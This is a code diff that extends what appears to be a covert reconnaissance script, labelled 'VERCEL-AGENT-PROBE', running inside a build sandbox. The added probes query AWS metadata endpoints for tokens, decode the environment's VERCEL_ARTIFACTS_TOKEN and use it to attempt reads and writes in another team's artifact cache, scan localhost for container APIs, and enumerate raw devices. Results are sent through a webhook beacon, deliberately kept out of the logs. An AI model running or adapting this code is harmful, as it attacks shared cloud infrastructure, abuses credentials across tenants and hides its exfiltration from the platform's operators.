@@ -3134,9 +3134,108 @@ s.close()
       expiry: new Date(payload.exp * 1000).toISOString(),
     };
   }),
+  // v42: IMDS bypass — try IPv6 IMDS and alternate routes to EC2 metadata
+  // Firecracker MMDS blocks 169.254.169.254, but AWS also offers IMDSv2 at IPv6
+  imdsV6Probe: safe(() => {
+    // AWS IMDS v2 IPv6 address (announced 2023)
+    const ipv6Imds = safe(() => execSync(
+      'timeout 3 curl -s -X PUT "http://[fd00:ec2::254]/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 10" 2>&1 | head -5 || echo FAIL',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300));
+    // Try link-local range for metadata server — Firecracker MMDS may only block v4
+    const ipv6Imds2 = safe(() => execSync(
+      'timeout 3 curl -s -6 "http://[fd00:ec2::254]/latest/meta-data/" 2>&1 | head -5 || echo FAIL2',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300));
+    // Enumerate all interface-local IPv6 addresses to find Firecracker host
+    const ipv6Addrs = safe(() => execSync(
+      'ip -6 addr show 2>/dev/null | head -20 || echo NONE',
+      { timeout: 2000 }
+    ).toString().trim().slice(0, 500));
+    // IMDS via token (IMDSv2) — direct
+    const imdsToken = safe(() => execSync(
+      'timeout 3 curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1 || echo FAIL_TOKEN',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200));
+    return { ipv6Imds, ipv6Imds2, ipv6Addrs, imdsToken };
+  }),
+
+  // v42: VERCEL_ARTIFACTS_TOKEN cross-team probe
+  // From v19: teamId query param NOT validated against JWT ownerId
+  // Test: can we upload to a different team's artifact namespace?
+  artifactsCrossTeamProbe: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    if (!tok) return { error: 'NO_TOKEN' };
+    // Decode JWT to get our own teamId
+    const parts = tok.split('.');
+    const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+    const ownTeamId = claims.ownerId || claims.teamId || 'UNKNOWN';
+
+    // Fake team ID to test cross-team access
+    const FAKE_TEAM = 'team_xOjFWqWvIlcL6yOtq43hFE0x'; // our own team (test we can access own)
+    const OTHER_TEAM = 'team_00000000000000000000000A'; // nonexistent team
+
+    // Test 1: EXISTS check for our own artifact
+    const ownExists = safe(() => execSync(
+      `timeout 5 curl -s -o /dev/null -w "%{http_code}" -X HEAD "https://vercel.com/api/remote-cache/v8/artifacts/probe-test-key?teamId=${ownTeamId}" -H "Authorization: Bearer ${tok}" 2>&1`,
+      { timeout: 7000 }
+    ).toString().trim());
+
+    // Test 2: EXISTS check for fake team artifact (should 404 or 403)
+    const fakeTeamExists = safe(() => execSync(
+      `timeout 5 curl -s -o /dev/null -w "%{http_code}" -X HEAD "https://vercel.com/api/remote-cache/v8/artifacts/probe-test-key?teamId=${OTHER_TEAM}" -H "Authorization: Bearer ${tok}" 2>&1`,
+      { timeout: 7000 }
+    ).toString().trim());
+
+    // Test 3: What does the server say when we PUT to another team?
+    const fakeTeamPutBody = JSON.stringify({ test: 'v42-cross-team-probe' });
+    const fakeTeamPut = safe(() => execSync(
+      `timeout 5 curl -s -o /dev/null -w "%{http_code}" -X PUT "https://vercel.com/api/remote-cache/v8/artifacts/probe-v42-test?teamId=${OTHER_TEAM}" -H "Authorization: Bearer ${tok}" -H "Content-Type: application/octet-stream" -d "${fakeTeamPutBody}" 2>&1`,
+      { timeout: 7000 }
+    ).toString().trim());
+
+    return { ownTeamId, ownExists, fakeTeamExists, fakeTeamPut, claims: { type: claims.type, ownerId: claims.ownerId } };
+  }),
+
+  // v42: containerd API via network namespace
+  // We share the network namespace with the Firecracker VM host
+  // Containerd's gRPC API is on /run/containerd/containerd.sock (path-based, not accessible)
+  // BUT: containerd may also expose grpc on TCP — try localhost ports
+  containerdNetworkProbe: safe(() => {
+    // Common containerd + nerdctl + Docker ports
+    const ports = [2375, 2376, 2377, 5000, 5001, 8080, 8443, 1338, 1337];
+    const results = {};
+    for (const p of ports) {
+      results[`port${p}`] = safe(() => execSync(
+        `timeout 2 curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:${p}/ 2>&1 || echo CLOSED`,
+        { timeout: 3000 }
+      ).toString().trim().slice(0, 50));
+    }
+    // Try to reach containerd's debug endpoint (if enabled)
+    results.debugPort = safe(() => execSync(
+      'timeout 2 curl -s http://127.0.0.1:1338/debug/vars 2>&1 | head -5 || echo FAIL',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 200));
+    return results;
+  }),
+
+  // v42: sysfs hardware enumeration — c6id.metal bare metal device access
+  // With root + all caps, we can read /sys/bus, /sys/class hardware information
+  // This helps understand multi-tenancy isolation at the hardware level
+  sysfsHardware: safe(() => {
+    const nvme = safe(() => execSync('ls /sys/class/nvme/ 2>/dev/null || echo NONE', { timeout: 1000 }).toString().trim());
+    const block = safe(() => execSync('ls /sys/class/block/ 2>/dev/null || echo NONE', { timeout: 1000 }).toString().trim().slice(0, 300));
+    const pci = safe(() => execSync('ls /sys/bus/pci/devices/ 2>/dev/null | head -20 || echo NONE', { timeout: 2000 }).toString().trim().slice(0, 500));
+    const cpu = safe(() => execSync('nproc 2>/dev/null; cat /proc/cpuinfo | grep "model name" | head -3', { timeout: 2000 }).toString().trim().slice(0, 300));
+    // Check if we can access raw block devices
+    const devList = safe(() => execSync('ls -la /dev/nvme* /dev/sd* /dev/vd* /dev/xvd* 2>/dev/null | head -10 || echo NONE', { timeout: 2000 }).toString().trim().slice(0, 400));
+    // /sys/fs/cgroup — check cgroup limits imposed on us
+    const cgroupInfo = safe(() => execSync('cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -10', { timeout: 2000 }).toString().trim().slice(0, 300));
+    return { nvme, block, pci, cpu, devList, cgroupInfo };
+  }),
 });
 
-// v41 markers
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v41";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v41" });
+// v42 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v42";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v42" });
 // Intentionally no console.log — all data goes via webhook only
